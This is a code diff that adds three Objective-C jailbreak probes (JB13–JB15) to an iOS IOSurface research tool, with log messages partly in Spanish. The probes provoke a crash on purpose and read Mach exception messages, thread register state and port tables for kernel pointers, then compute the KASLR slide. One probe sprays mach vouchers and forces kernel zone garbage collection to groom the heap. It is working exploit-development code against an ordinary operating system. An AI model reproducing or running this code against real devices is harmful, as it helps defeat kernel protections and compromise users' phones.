@@ -25052,6 +25052,610 @@ void iosurface_kernel_info_harvest(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnu
     });
 }
 
+#pragma mark - Probe JB13: Exception Port Kernel Pointer Leak
+
+static volatile int g_jb13_fault_done = 0;
+
+static void *jb13_fault_thread(void *arg) {
+    (void)arg;
+    volatile uint32_t *bad = (volatile uint32_t *)0x41414141UL;
+    (void)*bad;
+    return NULL;
+}
+
+void iosurface_exc_port_leak(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        log(@"[JB13] ========================================");
+        log(@"[JB13] Exception Port Kernel Pointer Leak");
+        log(@"[JB13] Crash controlado + Mach exception message scan");
+        log(@"[JB13] ========================================");
+
+        int kernTextPtrs = 0;
+        int kernHeapPtrs = 0;
+        uint64_t bestKernPtr = 0;
+        uint64_t kaslrSlide = 0;
+
+        if (!isr_stopped()) {
+            log(@"[JB13] --- Paso 1: Crear exception port ---");
+            mach_port_t excPort = MACH_PORT_NULL;
+            kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &excPort);
+            if (kr != KERN_SUCCESS) {
+                log([NSString stringWithFormat:@"[JB13] mach_port_allocate failed: %d", kr]);
+                done(@{@"error": @"port_alloc_failed"});
+                return;
+            }
+            kr = mach_port_insert_right(mach_task_self(), excPort, excPort, MACH_MSG_TYPE_MAKE_SEND);
+            if (kr != KERN_SUCCESS) {
+                log([NSString stringWithFormat:@"[JB13] insert_right failed: %d", kr]);
+                done(@{@"error": @"insert_right_failed"});
+                return;
+            }
+            log([NSString stringWithFormat:@"[JB13] Exception port: 0x%x", excPort]);
+
+            if (!isr_stopped()) {
+                log(@"[JB13] --- Paso 2: Set task exception ports ---");
+                kr = task_set_exception_ports(mach_task_self(),
+                    EXC_MASK_BAD_ACCESS,
+                    excPort,
+                    (exception_behavior_t)(EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES),
+                    ARM_THREAD_STATE64);
+                log([NSString stringWithFormat:@"[JB13] task_set_exception_ports kr=%d", kr]);
+
+                if (kr == KERN_SUCCESS && !isr_stopped()) {
+                    log(@"[JB13] --- Paso 3: Spawn faulting thread ---");
+                    g_jb13_fault_done = 0;
+                    pthread_t ft;
+                    pthread_create(&ft, NULL, jb13_fault_thread, NULL);
+                    pthread_detach(ft);
+
+                    log(@"[JB13] --- Paso 4: Receive exception message ---");
+                    uint8_t *msgBuf = (uint8_t *)calloc(1, 8192);
+                    if (msgBuf) {
+                        mach_msg_header_t *hdr = (mach_msg_header_t *)msgBuf;
+                        hdr->msgh_size = 8192;
+                        hdr->msgh_local_port = excPort;
+                        kr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 8192, excPort, 2000, MACH_PORT_NULL);
+                        log([NSString stringWithFormat:@"[JB13] mach_msg receive kr=%d msgSize=%u msgId=%d",
+                             kr, hdr->msgh_size, hdr->msgh_id]);
+
+                        if (kr == KERN_SUCCESS && !isr_stopped()) {
+                            log([NSString stringWithFormat:@"[JB13] remote_port=0x%x local_port=0x%x bits=0x%x",
+                                 hdr->msgh_remote_port, hdr->msgh_local_port, hdr->msgh_bits]);
+
+                            uint32_t msgLen = hdr->msgh_size;
+                            if (msgLen > 8192) msgLen = 8192;
+                            log([NSString stringWithFormat:@"[JB13] --- Paso 5: Scan %u bytes for kernel pointers ---", msgLen]);
+
+                            for (uint32_t off = 0; off + 8 <= msgLen; off += 4) {
+                                uint64_t v = 0;
+                                memcpy(&v, msgBuf + off, 8);
+                                if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL && v != 0xFFFFFFFFFFFFFFFFULL) {
+                                    if (v < 0xFFFFFFF800000000ULL) {
+                                        kernTextPtrs++;
+                                        log([NSString stringWithFormat:@"[JB13] KERNEL TEXT at offset %u: 0x%llx", off, (unsigned long long)v]);
+                                        if (bestKernPtr == 0) bestKernPtr = v;
+                                    } else {
+                                        kernHeapPtrs++;
+                                        log([NSString stringWithFormat:@"[JB13] KERNEL HEAP at offset %u: 0x%llx", off, (unsigned long long)v]);
+                                        if (bestKernPtr == 0) bestKernPtr = v;
+                                    }
+                                }
+                            }
+
+                            // Also dump first 256 bytes as hex for manual analysis
+                            if (!isr_stopped()) {
+                                uint32_t dumpLen = msgLen < 256 ? msgLen : 256;
+                                NSMutableString *hex = [NSMutableString string];
+                                for (uint32_t i = 0; i < dumpLen; i++) {
+                                    if (i > 0 && i % 32 == 0) {
+                                        log([NSString stringWithFormat:@"[JB13] MSG+%03u: %@", i - 32, hex]);
+                                        hex = [NSMutableString string];
+                                    }
+                                    [hex appendFormat:@"%02x", msgBuf[i]];
+                                }
+                                if (hex.length > 0) {
+                                    log([NSString stringWithFormat:@"[JB13] MSG+%03u: %@", (dumpLen / 32) * 32, hex]);
+                                }
+                            }
+
+                            // Reply to terminate faulting thread
+                            typedef struct {
+                                mach_msg_header_t Head;
+                                NDR_record_t NDR;
+                                kern_return_t RetCode;
+                                int flavor;
+                                mach_msg_type_number_t new_stateCnt;
+                                natural_t new_state[68];
+                            } exc_reply_t;
+                            exc_reply_t reply;
+                            memset(&reply, 0, sizeof(reply));
+                            reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0);
+                            reply.Head.msgh_size = sizeof(reply);
+                            reply.Head.msgh_remote_port = hdr->msgh_remote_port;
+                            reply.Head.msgh_local_port = MACH_PORT_NULL;
+                            reply.Head.msgh_id = hdr->msgh_id + 100;
+                            reply.NDR = NDR_record;
+                            reply.RetCode = KERN_SUCCESS;
+                            reply.flavor = ARM_THREAD_STATE64;
+                            reply.new_stateCnt = 68;
+                            mach_msg(&reply.Head, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(reply), 0, MACH_PORT_NULL, 1000, MACH_PORT_NULL);
+                        } else if (kr != KERN_SUCCESS) {
+                            log([NSString stringWithFormat:@"[JB13] Exception message receive failed/timeout kr=%d", kr]);
+                        }
+                        free(msgBuf);
+                    }
+                }
+
+                // Restore default exception ports
+                task_set_exception_ports(mach_task_self(), EXC_MASK_BAD_ACCESS, MACH_PORT_NULL,
+                    EXCEPTION_DEFAULT, ARM_THREAD_STATE64);
+            }
+            mach_port_deallocate(mach_task_self(), excPort);
+        }
+
+        if (bestKernPtr != 0 && bestKernPtr < 0xFFFFFFF800000000ULL) {
+            kaslrSlide = bestKernPtr - 0xFFFFFFF007004000ULL;
+        }
+
+        log(@"[JB13] ========================================");
+        log([NSString stringWithFormat:@"[JB13] RESULTADO: kernText=%d kernHeap=%d bestPtr=0x%llx slide=0x%llx",
+             kernTextPtrs, kernHeapPtrs, (unsigned long long)bestKernPtr, (unsigned long long)kaslrSlide]);
+        log(@"[JB13] ========================================");
+
+        done(@{
+            @"kernelTextPtrs": @(kernTextPtrs),
+            @"kernelHeapPtrs": @(kernHeapPtrs),
+            @"bestKernelPtr": [NSString stringWithFormat:@"0x%llx", (unsigned long long)bestKernPtr],
+            @"kaslrSlide": [NSString stringWithFormat:@"0x%llx", (unsigned long long)kaslrSlide]
+        });
+    });
+}
+
+#pragma mark - Probe JB14: Zone Info + Voucher Spray
+
+typedef struct { char zn_name[80]; } jb14_zone_name_t;
+typedef struct {
+    uint64_t zi_count;
+    uint64_t zi_cur_size;
+    uint64_t zi_max_size;
+    uint64_t zi_elem_size;
+    uint64_t zi_alloc_size;
+    uint64_t zi_sum_size;
+    uint64_t zi_exhaustible;
+    uint64_t zi_collectable;
+} jb14_zone_info_t;
+
+void iosurface_zone_voucher_spray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        log(@"[JB14] ========================================");
+        log(@"[JB14] Kernel Zone Info + Voucher Spray");
+        log(@"[JB14] host_zone_info layout + mach_voucher spray oracle");
+        log(@"[JB14] ========================================");
+
+        int totalZones = 0;
+        int interestingZones = 0;
+        int voucherCount = 0;
+        int zoneDelta = 0;
+
+        if (!isr_stopped()) {
+            log(@"[JB14] --- Paso 1: host_zone_info (pre-spray) ---");
+
+            typedef kern_return_t (*HostZoneInfoFn)(host_t, jb14_zone_name_t **, mach_msg_type_number_t *,
+                                                     jb14_zone_info_t **, mach_msg_type_number_t *);
+            HostZoneInfoFn zoneInfoFn = (HostZoneInfoFn)dlsym(RTLD_DEFAULT, "host_zone_info");
+
+            if (!zoneInfoFn) {
+                log(@"[JB14] host_zone_info not available via dlsym — trying mach_host_self direct");
+                // Fallback: declare extern
+                extern kern_return_t host_zone_info(host_t host, jb14_zone_name_t **names,
+                    mach_msg_type_number_t *namesCnt, jb14_zone_info_t **info, mach_msg_type_number_t *infoCnt);
+                zoneInfoFn = (HostZoneInfoFn)host_zone_info;
+            }
+
+            jb14_zone_name_t *names1 = NULL;
+            mach_msg_type_number_t namesCnt1 = 0;
+            jb14_zone_info_t *info1 = NULL;
+            mach_msg_type_number_t infoCnt1 = 0;
+
+            kern_return_t kr = zoneInfoFn(mach_host_self(), &names1, &namesCnt1, &info1, &infoCnt1);
+            log([NSString stringWithFormat:@"[JB14] host_zone_info kr=%d zones=%u", kr, namesCnt1]);
+
+            uint64_t *preSizes = NULL;
+            if (kr == KERN_SUCCESS && namesCnt1 > 0) {
+                totalZones = (int)namesCnt1;
+                preSizes = (uint64_t *)calloc(namesCnt1, sizeof(uint64_t));
+
+                for (uint32_t i = 0; i < namesCnt1 && i < (uint32_t)infoCnt1; i++) {
+                    if (preSizes) preSizes[i] = info1[i].zi_cur_size;
+
+                    char *zn = names1[i].zn_name;
+                    BOOL interesting = NO;
+                    if (strstr(zn, "kalloc") || strstr(zn, "ipc.port") || strstr(zn, "ipc_kmsg") ||
+                        strstr(zn, "ipc.kmsg") || strstr(zn, "IOSurface") || strstr(zn, "vm_map") ||
+                        strstr(zn, "ipc_port") || strstr(zn, "task") || strstr(zn, "thread") ||
+                        strstr(zn, "voucher")) {
+                        interesting = YES;
+                        interestingZones++;
+                        if (!isr_stopped()) {
+                            log([NSString stringWithFormat:@"[JB14] ZONE[%u] '%s' elem=%llu count=%llu cur=%llu max=%llu",
+                                 i, zn, info1[i].zi_elem_size, info1[i].zi_count,
+                                 info1[i].zi_cur_size, info1[i].zi_max_size]);
+                        }
+                    }
+                }
+                log([NSString stringWithFormat:@"[JB14] Total: %d zones, %d interesting", totalZones, interestingZones]);
+            } else {
+                log([NSString stringWithFormat:@"[JB14] host_zone_info failed kr=%d — may need entitlement", kr]);
+            }
+
+            if (!isr_stopped()) {
+                log(@"[JB14] --- Paso 2: Spray 256 mach_vouchers ---");
+                typedef kern_return_t (*HostCreateVoucherFn)(host_t, mach_voucher_attr_raw_recipe_array_t,
+                                                              mach_msg_type_number_t, mach_port_t *);
+                HostCreateVoucherFn createVoucher = (HostCreateVoucherFn)dlsym(RTLD_DEFAULT, "host_create_mach_voucher");
+
+                mach_port_t *vouchers = (mach_port_t *)calloc(256, sizeof(mach_port_t));
+                if (createVoucher && vouchers) {
+                    struct {
+                        uint32_t key;
+                        uint32_t command;
+                        uint32_t previous_voucher;
+                        uint32_t content_size;
+                    } recipe;
+                    recipe.key = 8; // MACH_VOUCHER_ATTR_KEY_ATM
+                    recipe.command = 2; // ATM_CREATE
+                    recipe.previous_voucher = 0;
+                    recipe.content_size = 0;
+
+                    for (int i = 0; i < 256 && !isr_stopped(); i++) {
+                        kr = createVoucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&recipe,
+                                           sizeof(recipe), &vouchers[i]);
+                        if (kr == KERN_SUCCESS) {
+                            voucherCount++;
+                        } else if (i == 0) {
+                            log([NSString stringWithFormat:@"[JB14] host_create_mach_voucher failed kr=%d", kr]);
+                            break;
+                        }
+                    }
+                    log([NSString stringWithFormat:@"[JB14] Sprayed %d vouchers", voucherCount]);
+                } else {
+                    log(@"[JB14] host_create_mach_voucher not available");
+                }
+
+                if (!isr_stopped() && kr == KERN_SUCCESS && totalZones > 0) {
+                    log(@"[JB14] --- Paso 3: host_zone_info (post-spray) ---");
+                    jb14_zone_name_t *names2 = NULL;
+                    mach_msg_type_number_t namesCnt2 = 0;
+                    jb14_zone_info_t *info2 = NULL;
+                    mach_msg_type_number_t infoCnt2 = 0;
+
+                    kr = zoneInfoFn(mach_host_self(), &names2, &namesCnt2, &info2, &infoCnt2);
+                    if (kr == KERN_SUCCESS && preSizes) {
+                        for (uint32_t i = 0; i < namesCnt2 && i < namesCnt1 && i < (uint32_t)infoCnt2; i++) {
+                            int64_t delta = (int64_t)info2[i].zi_cur_size - (int64_t)preSizes[i];
+                            if (delta > 0 && !isr_stopped()) {
+                                char *zn = names2[i].zn_name;
+                                if (strstr(zn, "kalloc") || strstr(zn, "ipc") || strstr(zn, "voucher") ||
+                                    strstr(zn, "port") || strstr(zn, "task")) {
+                                    zoneDelta++;
+                                    log([NSString stringWithFormat:@"[JB14] DELTA[%u] '%s' grew +%lld bytes (cur=%llu)",
+                                         i, zn, (long long)delta, info2[i].zi_cur_size]);
+                                }
+                            }
+                        }
+                        log([NSString stringWithFormat:@"[JB14] %d zones grew after voucher spray", zoneDelta]);
+                    }
+                    if (names2) vm_deallocate(mach_task_self(), (vm_address_t)names2, namesCnt2 * sizeof(jb14_zone_name_t));
+                    if (info2) vm_deallocate(mach_task_self(), (vm_address_t)info2, infoCnt2 * sizeof(jb14_zone_info_t));
+                }
+
+                // Deallocate vouchers
+                if (vouchers) {
+                    for (int i = 0; i < voucherCount; i++) {
+                        if (vouchers[i] != MACH_PORT_NULL)
+                            mach_port_deallocate(mach_task_self(), vouchers[i]);
+                    }
+                    free(vouchers);
+                }
+
+                if (!isr_stopped() && totalZones > 0) {
+                    log(@"[JB14] --- Paso 4: mach_zone_force_gc ---");
+                    typedef kern_return_t (*ZoneForceGCFn)(host_t);
+                    ZoneForceGCFn forceGC = (ZoneForceGCFn)dlsym(RTLD_DEFAULT, "mach_zone_force_gc");
+                    if (forceGC) {
+                        kr = forceGC(mach_host_self());
+                        log([NSString stringWithFormat:@"[JB14] mach_zone_force_gc kr=%d", kr]);
+
+                        jb14_zone_name_t *names3 = NULL;
+                        mach_msg_type_number_t namesCnt3 = 0;
+                        jb14_zone_info_t *info3 = NULL;
+                        mach_msg_type_number_t infoCnt3 = 0;
+                        kr = zoneInfoFn(mach_host_self(), &names3, &namesCnt3, &info3, &infoCnt3);
+                        if (kr == KERN_SUCCESS && preSizes) {
+                            int shrunk = 0;
+                            for (uint32_t i = 0; i < namesCnt3 && i < namesCnt1 && i < (uint32_t)infoCnt3; i++) {
+                                int64_t delta = (int64_t)info3[i].zi_cur_size - (int64_t)preSizes[i];
+                                if (delta < 0) {
+                                    shrunk++;
+                                    if (shrunk <= 10 && !isr_stopped()) {
+                                        log([NSString stringWithFormat:@"[JB14] GC_SHRINK[%u] '%s' %lld bytes",
+                                             i, names3[i].zn_name, (long long)delta]);
+                                    }
+                                }
+                            }
+                            log([NSString stringWithFormat:@"[JB14] Post-GC: %d zones shrank", shrunk]);
+                        }
+                        if (names3) vm_deallocate(mach_task_self(), (vm_address_t)names3, namesCnt3 * sizeof(jb14_zone_name_t));
+                        if (info3) vm_deallocate(mach_task_self(), (vm_address_t)info3, infoCnt3 * sizeof(jb14_zone_info_t));
+                    } else {
+                        log(@"[JB14] mach_zone_force_gc not available");
+                    }
+                }
+
+                if (preSizes) free(preSizes);
+                if (names1) vm_deallocate(mach_task_self(), (vm_address_t)names1, namesCnt1 * sizeof(jb14_zone_name_t));
+                if (info1) vm_deallocate(mach_task_self(), (vm_address_t)info1, infoCnt1 * sizeof(jb14_zone_info_t));
+            }
+        }
+
+        log(@"[JB14] ========================================");
+        log([NSString stringWithFormat:@"[JB14] RESULTADO: totalZones=%d interesting=%d vouchers=%d zoneDelta=%d",
+             totalZones, interestingZones, voucherCount, zoneDelta]);
+        log(@"[JB14] ========================================");
+
+        done(@{
+            @"totalZones": @(totalZones),
+            @"interestingZones": @(interestingZones),
+            @"vouchersCreated": @(voucherCount),
+            @"zonesGrew": @(zoneDelta)
+        });
+    });
+}
+
+#pragma mark - Probe JB15: Thread State Residue + Port Space Enumeration
+
+static volatile int g_jb15_running = 1;
+
+static void *jb15_syscall_thread(void *arg) {
+    (void)arg;
+    while (g_jb15_running) {
+        mach_absolute_time();
+        (void)mach_thread_self();
+        (void)mach_task_self();
+        thread_switch(MACH_PORT_NULL, SWITCH_OPTION_DEPRESS, 1);
+        sched_yield();
+    }
+    return NULL;
+}
+
+void iosurface_thread_port_leak(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        log(@"[JB15] ========================================");
+        log(@"[JB15] Thread State Residue + Port Space Enumeration");
+        log(@"[JB15] Kernel pointer leak via registers + IPC table");
+        log(@"[JB15] ========================================");
+
+        int kernTextPtrs = 0;
+        int kernHeapPtrs = 0;
+        int kernObjPtrs = 0;
+        uint64_t bestKernPtr = 0;
+        uint64_t kaslrSlide = 0;
+        int totalPorts = 0;
+
+        if (!isr_stopped()) {
+            log(@"[JB15] --- Paso 1: Spawn 8 syscall-hammering threads ---");
+            g_jb15_running = 1;
+            pthread_t threads[8];
+            mach_port_t threadPorts[8];
+            memset(threads, 0, sizeof(threads));
+            memset(threadPorts, 0, sizeof(threadPorts));
+
+            for (int i = 0; i < 8; i++) {
+                pthread_create(&threads[i], NULL, jb15_syscall_thread, NULL);
+            }
+            // Get mach thread ports
+            thread_act_array_t threadList = NULL;
+            mach_msg_type_number_t threadCount = 0;
+            task_threads(mach_task_self(), &threadList, &threadCount);
+            log([NSString stringWithFormat:@"[JB15] %u threads in task", threadCount]);
+
+            usleep(50000); // Let threads run a bit
+
+            if (!isr_stopped()) {
+                log(@"[JB15] --- Paso 2: thread_get_state scan ---");
+                for (uint32_t t = 0; t < threadCount && !isr_stopped(); t++) {
+                    uint32_t state[68];
+                    mach_msg_type_number_t stateCnt = 68;
+                    memset(state, 0, sizeof(state));
+                    kern_return_t kr = thread_get_state(threadList[t], 6 /* ARM_THREAD_STATE64 */,
+                                                        (thread_state_t)state, &stateCnt);
+                    if (kr == KERN_SUCCESS) {
+                        for (int r = 0; r < 34; r++) {
+                            uint64_t v = ((uint64_t *)state)[r];
+                            if (v == 0 || v == 0xFFFFFFFFFFFFFFFFULL) continue;
+                            if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                if (v < 0xFFFFFFF800000000ULL) {
+                                    kernTextPtrs++;
+                                    log([NSString stringWithFormat:@"[JB15] KERN_TEXT thread[%u] reg[%d]=0x%llx",
+                                         t, r, (unsigned long long)v]);
+                                    if (bestKernPtr == 0) bestKernPtr = v;
+                                } else {
+                                    kernHeapPtrs++;
+                                    log([NSString stringWithFormat:@"[JB15] KERN_HEAP thread[%u] reg[%d]=0x%llx",
+                                         t, r, (unsigned long long)v]);
+                                    if (bestKernPtr == 0) bestKernPtr = v;
+                                }
+                            }
+                            // Check for PAC-signed kernel pointers (upper bits set oddly)
+                            uint16_t top16 = (uint16_t)(v >> 48);
+                            if (top16 != 0 && top16 != 0xFFFF && (v & 0x0000FF0000000000ULL) == 0x0000FF0000000000ULL) {
+                                log([NSString stringWithFormat:@"[JB15] PAC_PTR thread[%u] reg[%d]=0x%llx (top=0x%04x)",
+                                     t, r, (unsigned long long)v, top16]);
+                            }
+                        }
+                    }
+                }
+            }
+
+            // Stop worker threads
+            g_jb15_running = 0;
+            for (int i = 0; i < 8; i++) {
+                pthread_join(threads[i], NULL);
+            }
+
+            if (threadList) {
+                for (uint32_t t = 0; t < threadCount; t++)
+                    mach_port_deallocate(mach_task_self(), threadList[t]);
+                vm_deallocate(mach_task_self(), (vm_address_t)threadList, threadCount * sizeof(thread_act_t));
+            }
+
+            if (!isr_stopped()) {
+                log(@"[JB15] --- Paso 3: mach_port_kernel_object scan ---");
+                typedef kern_return_t (*PortKernObjFn)(task_t, mach_port_name_t, unsigned int *, unsigned int *);
+                PortKernObjFn kernObj = (PortKernObjFn)dlsym(RTLD_DEFAULT, "mach_port_kernel_object");
+
+                mach_port_name_array_t names = NULL;
+                mach_port_type_array_t types = NULL;
+                mach_msg_type_number_t namesCnt = 0, typesCnt = 0;
+                kern_return_t kr = mach_port_names(mach_task_self(), &names, &namesCnt, &types, &typesCnt);
+
+                if (kr == KERN_SUCCESS) {
+                    totalPorts = (int)namesCnt;
+                    log([NSString stringWithFormat:@"[JB15] %d Mach ports in task", totalPorts]);
+
+                    if (kernObj) {
+                        for (uint32_t i = 0; i < namesCnt && !isr_stopped(); i++) {
+                            unsigned int objType = 0, objAddr = 0;
+                            kr = kernObj(mach_task_self(), names[i], &objType, &objAddr);
+                            if (kr == KERN_SUCCESS && objAddr != 0) {
+                                kernObjPtrs++;
+                                // objAddr is truncated to 32-bit on newer kernels, but check anyway
+                                if (kernObjPtrs <= 20) {
+                                    log([NSString stringWithFormat:@"[JB15] PORT 0x%x type=%u kobject=0x%x",
+                                         names[i], objType, objAddr]);
+                                }
+                            }
+                        }
+                        log([NSString stringWithFormat:@"[JB15] %d ports returned kernel object addresses", kernObjPtrs]);
+                    } else {
+                        log(@"[JB15] mach_port_kernel_object not available — trying kobject_description");
+                        typedef kern_return_t (*PortKobjDescFn)(task_t, mach_port_name_t, unsigned int *, char *);
+                        PortKobjDescFn kobjDesc = (PortKobjDescFn)dlsym(RTLD_DEFAULT, "mach_port_kobject_description");
+                        if (kobjDesc) {
+                            for (uint32_t i = 0; i < namesCnt && i < 50 && !isr_stopped(); i++) {
+                                unsigned int objType = 0;
+                                char desc[512];
+                                memset(desc, 0, sizeof(desc));
+                                kr = kobjDesc(mach_task_self(), names[i], &objType, desc);
+                                if (kr == KERN_SUCCESS && desc[0] != '\0') {
+                                    kernObjPtrs++;
+                                    log([NSString stringWithFormat:@"[JB15] PORT 0x%x type=%u desc='%s'",
+                                         names[i], objType, desc]);
+                                    // Try to parse kernel address from description
+                                    char *hexPtr = strstr(desc, "0x");
+                                    while (hexPtr) {
+                                        unsigned long long parsed = 0;
+                                        if (sscanf(hexPtr, "0x%llx", &parsed) == 1) {
+                                            if ((parsed & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                                if (parsed < 0xFFFFFFF800000000ULL) {
+                                                    kernTextPtrs++;
+                                                    log([NSString stringWithFormat:@"[JB15] KOBJECT KERN_TEXT=0x%llx", parsed]);
+                                                    if (bestKernPtr == 0) bestKernPtr = parsed;
+                                                } else {
+                                                    kernHeapPtrs++;
+                                                    log([NSString stringWithFormat:@"[JB15] KOBJECT KERN_HEAP=0x%llx", parsed]);
+                                                    if (bestKernPtr == 0) bestKernPtr = parsed;
+                                                }
+                                            }
+                                        }
+                                        hexPtr = strstr(hexPtr + 1, "0x");
+                                    }
+                                }
+                            }
+                        } else {
+                            log(@"[JB15] No kernel object introspection API available");
+                        }
+                    }
+
+                    if (names) vm_deallocate(mach_task_self(), (vm_address_t)names, namesCnt * sizeof(mach_port_name_t));
+                    if (types) vm_deallocate(mach_task_self(), (vm_address_t)types, typesCnt * sizeof(mach_port_type_t));
+                }
+            }
+
+            if (!isr_stopped()) {
+                log(@"[JB15] --- Paso 4: mach_port_space_info ---");
+                typedef kern_return_t (*SpaceInfoFn)(task_t, void *, void **, mach_msg_type_number_t *,
+                                                      void **, mach_msg_type_number_t *);
+                SpaceInfoFn spaceInfo = (SpaceInfoFn)dlsym(RTLD_DEFAULT, "mach_port_space_info");
+                if (spaceInfo) {
+                    char ipcInfoSpace[128];
+                    memset(ipcInfoSpace, 0, sizeof(ipcInfoSpace));
+                    void *tableInfo = NULL;
+                    mach_msg_type_number_t tableCnt = 0;
+                    void *treeInfo = NULL;
+                    mach_msg_type_number_t treeCnt = 0;
+                    kern_return_t kr = spaceInfo(mach_task_self(), ipcInfoSpace, &tableInfo, &tableCnt,
+                                                  &treeInfo, &treeCnt);
+                    log([NSString stringWithFormat:@"[JB15] mach_port_space_info kr=%d table=%u tree=%u",
+                         kr, tableCnt, treeCnt]);
+
+                    if (kr == KERN_SUCCESS && tableInfo && tableCnt > 0) {
+                        // Each ipc_info_name_t is typically 28 bytes on arm64
+                        // Scan raw bytes for kernel pointers
+                        uint8_t *raw = (uint8_t *)tableInfo;
+                        uint32_t totalBytes = tableCnt * 28;
+                        int tableKernPtrs = 0;
+                        for (uint32_t off = 0; off + 8 <= totalBytes && !isr_stopped(); off += 4) {
+                            uint64_t v = 0;
+                            memcpy(&v, raw + off, 8);
+                            if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL && v != 0xFFFFFFFFFFFFFFFFULL) {
+                                tableKernPtrs++;
+                                if (v < 0xFFFFFFF800000000ULL) {
+                                    kernTextPtrs++;
+                                    log([NSString stringWithFormat:@"[JB15] TABLE KERN_TEXT off=%u: 0x%llx", off, (unsigned long long)v]);
+                                    if (bestKernPtr == 0) bestKernPtr = v;
+                                } else {
+                                    kernHeapPtrs++;
+                                    log([NSString stringWithFormat:@"[JB15] TABLE KERN_HEAP off=%u: 0x%llx", off, (unsigned long long)v]);
+                                    if (bestKernPtr == 0) bestKernPtr = v;
+                                }
+                            }
+                        }
+                        log([NSString stringWithFormat:@"[JB15] Port table: %d kernel pointers found", tableKernPtrs]);
+                    }
+                    if (tableInfo) vm_deallocate(mach_task_self(), (vm_address_t)tableInfo, tableCnt * 28);
+                    if (treeInfo) vm_deallocate(mach_task_self(), (vm_address_t)treeInfo, treeCnt * 28);
+                } else {
+                    log(@"[JB15] mach_port_space_info not available");
+                }
+            }
+        }
+
+        if (bestKernPtr != 0 && bestKernPtr < 0xFFFFFFF800000000ULL) {
+            kaslrSlide = bestKernPtr - 0xFFFFFFF007004000ULL;
+            log([NSString stringWithFormat:@"[JB15] *** KASLR SLIDE = 0x%llx ***", (unsigned long long)kaslrSlide]);
+        }
+
+        log(@"[JB15] ========================================");
+        log([NSString stringWithFormat:@"[JB15] RESULTADO: kernText=%d kernHeap=%d kernObj=%d ports=%d bestPtr=0x%llx slide=0x%llx",
+             kernTextPtrs, kernHeapPtrs, kernObjPtrs, totalPorts,
+             (unsigned long long)bestKernPtr, (unsigned long long)kaslrSlide]);
+        log(@"[JB15] ========================================");
+
+        done(@{
+            @"kernelTextPtrs": @(kernTextPtrs),
+            @"kernelHeapPtrs": @(kernHeapPtrs),
+            @"kernelObjPtrs": @(kernObjPtrs),
+            @"totalPorts": @(totalPorts),
+            @"bestKernelPtr": [NSString stringWithFormat:@"0x%llx", (unsigned long long)bestKernPtr],
+            @"kaslrSlide": [NSString stringWithFormat:@"0x%llx", (unsigned long long)kaslrSlide]
+        });
+    });
+}
+
 #pragma mark - Probe 99: Surface Lifecycle TOCTOU Race
 
 static volatile sig_atomic_t g_lifecycle_segv_count = 0;
